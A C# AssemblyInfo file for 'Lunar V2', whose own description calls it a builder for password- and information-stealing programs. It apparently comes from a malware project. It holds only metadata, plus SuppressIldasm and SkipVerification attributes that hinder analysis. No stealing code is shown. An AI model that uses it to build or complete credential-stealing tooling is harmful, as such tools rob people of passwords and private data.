﻿using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Permissions;

[assembly: Extension]
[assembly: AssemblyTitle("Lunar V2")]
[assembly: AssemblyDescription("Program that you can use to build a program which steals passwords and other information.")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Lunar V2")]
[assembly: AssemblyProduct("Lunar V2")]
[assembly: AssemblyCopyright("Copyright © Nex 2021")]
[assembly: AssemblyTrademark("")]
[assembly: Guid("be382b7d-b8cc-423b-99eb-16ea9c049bdd")]
[assembly: AssemblyFileVersion("2.0.0.0")]
[assembly: ComVisible(false)]
[assembly: SuppressIldasm]
[assembly: AssemblyVersion("2.0.0.0")]
[assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]
